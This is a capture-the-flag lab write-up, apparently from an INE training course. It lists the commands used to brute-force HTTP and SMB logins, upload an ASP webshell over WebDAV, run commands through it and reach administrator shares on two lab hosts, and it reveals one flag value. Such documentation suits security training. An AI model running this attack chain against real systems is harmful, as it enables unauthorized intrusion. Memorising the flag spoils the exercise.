# Command Reference — Host & Network Penetration Testing: System-Host Based Attacks CTF 1

A concise technical reference of all verified commands, queries, and requests executed during the **Host & Network Penetration Testing: System-Host Based Attacks CTF 1** laboratory engagement, organized by attack phase and target host.

---

## 1. Target 1: Online HTTP Credential Brute-Forcing

### Hydra HTTP GET Brute Force
```bash
hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get
```
- **Purpose**: Online dictionary attack against HTTP authentication on `target1.ine.local` targeting user `bob`.
- **Options Explained**:
  - `-l bob`: Target username to brute-force.
  - `-P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`: Path to password dictionary.
  - `target1.ine.local`: Target host.
  - `http-get`: Specifies the protocol module for HTTP GET authentication. The observed prompt was consistent with HTTP Basic Authentication, and Digest authentication was not established by the evidence.
- **Observed Result**: Successfully cracked credentials in 7 seconds:
  `[80][http-get] host: target1.ine.local login: bob password: [REDACTED]`
- **Screenshot Reference**: `02-target1-hydra-http-bruteforce.png` (Screenshot 02).

---

## 2. Target 1: Web Content Enumeration

### Authenticated Directory Brute-Forcing with DIRB
```bash
dirb http://target1.ine.local -u bob:[REDACTED]
```
- **Purpose**: Discovers hidden web directories on `target1.ine.local` using valid credentials for `bob`.
- **Options Explained**:
  - `http://target1.ine.local`: Base URL to scan.
  - `-u bob:[REDACTED]`: Passes credentials in HTTP Basic Authorization headers.
  - Default wordlist: `/usr/share/dirb/wordlists/common.txt` (4,612 entries).
- **Observed Result**: Discovered `http://target1.ine.local/webdav/` with directory listing enabled:
  `==> DIRECTORY: http://target1.ine.local/webdav/`
  `(!) WARNING: Directory IS LISTABLE. No need to scan it.`
- **Screenshot Reference**: `05-target1-dirb-webdav-discovery.png` (Screenshot 05).

---

## 3. Target 1: WebDAV Auditing & Verification

### Testing WebDAV Capabilities with davtest
```bash
davtest -auth bob:[REDACTED] -url http://target1.ine.local/webdav/
```
- **Purpose**: Audits WebDAV permissions, HTTP methods, directory creation (`MKCOL`), file uploading (`PUT`), and server-side script execution.
- **Options Explained**:
  - `-auth bob:[REDACTED]`: Credentials for WebDAV authentication.
  - `-url http://target1.ine.local/webdav/`: Target WebDAV URL.
- **Observed Result**:
  - Directory creation `MKCOL` succeeded (`DavTestDir_Boqk4nCiQsRcK`).
  - File upload `PUT` succeeded for `.asp`, `.aspx`, `.cgi`, `.html`, `.txt`, `.php`, `.cfm`, `.pl`.
  - File execution `EXEC` succeeded for `.asp` and `.aspx` (with `.aspx` execution actively tested in Screenshot 07 and `.asp` execution confirmed in the completed summary of Screenshot 08).
- **Screenshot Reference**: `07-target1-davtest-testing.png` (Screenshot 07 — partial active execution output) & `08-target1-davtest-summary.png` (Screenshot 08 — final completed execution summary).

---

## 4. Target 1: WebDAV Exploitation & Webshell Deployment

### Interactive WebDAV File Upload via cadaver
```bash
cadaver http://target1.ine.local
```
- **Purpose**: Establishes an authenticated interactive WebDAV session using cracked credentials for user `bob` to upload a server-side ASP web shell.
- **Interactive Commands Executed**:
  ```text
  dav:/> cd webdav
  dav:/webdav/> ls
  dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
  ```
- **Observed Result**: Successfully uploaded `/usr/share/webshells/asp/webshell.asp` (1,362 bytes) into the `/webdav/` directory:
  `Uploading /usr/share/webshells/asp/webshell.asp to '/webdav/webshell.asp': 100.0% succeeded.`
- **Screenshot Reference**: `09-target1-cadaver-webshell-upload.png` (Screenshot 09).

---

## 5. Target 1: Webshell Command Execution & File Retrieval

### Remote Directory Listing via Webshell
```cmd
dir c:\
```
- **Purpose**: Enumerate root directory of `C:\` on `target1.ine.local` to locate Flag 2.
- **Observed Result**: Disclosed system properties (`EC2AMAZ-JVD17HK\bob`, IIS 10.0, IP `10.5.27.190`) and identified `flag2.txt` (34 bytes):
  `11/17/2026 02:02 PM 34 flag2.txt`
- **Screenshot Reference**: `10-target1-webshell-dir-command.png` (Screenshot 10) & `11-target1-webshell-c-drive-flag2-discovery.png` (Screenshot 11).

### Reading Flag 2 Contents via Webshell
```cmd
type C:\flag2.txt
```
- **Purpose**: Display the contents of `C:\flag2.txt` using the Windows `type` command.
- **Observed Result**: In the webshell GUI, command output was concatenated directly with the server IP string. Separating the values:
  - Server IP: `10.5.27.190`
  - Flag 2: `aee247f5c45a41b58db53dc77d6b9263`
- **Screenshot Reference**: `12-target1-webshell-flag2-extraction.png` (Screenshot 12).

---

## 6. Target 2: SMB Authentication Brute-Forcing

### Metasploit SMB Login Scanner Module
```text
msfconsole -q
use auxiliary/scanner/smb/smb_login
set rhost target2.ine.local
set SMBUser administrator
set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set verbose false
run
```
- **Purpose**: Brute-forces SMB credentials for the local `Administrator` account on `target2.ine.local`.
- **Options Explained**:
  - `set rhost target2.ine.local`: Specifies the second lab target.
  - `set SMBUser administrator`: Targets the local administrator account.
  - `set pass_file .../unix_passwords.txt`: Wordlist path.
  - `set verbose false`: Displays only successful logon results.
- **Observed Result**: Successfully discovered valid credentials against `10.5.24.116:445`:
  `[+] 10.5.24.116:445 - Success: '.\administrator:[REDACTED]' Administrator`
- **Screenshot Reference**: `13-target2-metasploit-smb-login-bruteforce.png` (Screenshot 13).

---

## 7. Target 2: SMB Share Enumeration & File System Access

### Enumerating SMB Shares via smbclient
```bash
smbclient -L target2.ine.local -U Administrator
```
- **Purpose**: Queries available administrative and user shares on `target2.ine.local`.
- **Options Explained**:
  - `-L target2.ine.local`: Lists available shares.
  - `-U Administrator`: Authenticates as user `Administrator`.
- **Observed Result**: Discovered default administrative shares (`ADMIN$`, `C$`, `IPC$`) and custom disk shares (`Shared`, `Shared2`, `Shared3`).
- **Screenshot Reference**: `14-target2-smbclient-share-enumeration.png` (Screenshot 14).

### Accessing Administrative C$ Share & Identifying Flag 3
```bash
smbclient //target2.ine.local/C$ -U administrator
```
- **Purpose**: Establishes an authenticated SMB session using cracked credentials for `Administrator` to access the administrative `C$` root share.
- **Interactive Commands Executed**:
  ```text
  smb: \> ls
  ```
- **Observed Result**: Authenticated as `Administrator` and discovered `flag3.txt` (34 bytes; file located, content not captured in screenshots) in the root directory of the C$ share:
  `flag3.txt A 34 Tue Nov 17 20:28:41 2026`
- **Screenshot Reference**: `15-target2-smbclient-c-share-flag3-discovery.png` (Screenshot 15).

### Traversing to Administrator Desktop & Identifying Flag 4
```text
smb: \Users\Administrator\Desktop\> ls
```
- **Purpose**: Navigates into the Administrator profile desktop folder to fulfill Objective 4.
- **Observed Result**: Authenticated as `Administrator` and discovered `flag4.txt` (34 bytes; file located, content not captured in screenshots):
  `flag4.txt A 34 Tue Nov 17 20:28:41 2026`
- **Screenshot Reference**: `16-target2-smbclient-desktop-flag4-discovery.png` (Screenshot 16).

---

## 8. Unexecuted Reference Syntax (Not Executed in Lab)

> [!NOTE] Non-Executed Pedagogical Reference Examples
> The commands below represent theoretical command-line alternatives for automated or non-interactive environments. These commands were **not executed** in this laboratory engagement and are provided solely for general educational reference. Primary laboratory evidence for file identification was conducted interactively via cadaver, Firefox, and smbclient as documented in Sections 1 through 7 above. Neither Flag 1, Flag 3, nor Flag 4 was downloaded or extracted via these reference commands.

### WebDAV Script Upload via cURL (Reference Example Only)
```bash
# Upload an ASP webshell using cURL HTTP PUT (Unexecuted)
curl -T /usr/share/webshells/asp/webshell.asp -u bob:[REDACTED] http://target1.ine.local/webdav/webshell.asp
```

### SMB Share Listing via CrackMapExec (Reference Example Only)
```bash
# Query SMB shares non-interactively using CrackMapExec (Unexecuted)
crackmapexec smb target2.ine.local -u administrator -p [REDACTED] --shares
```
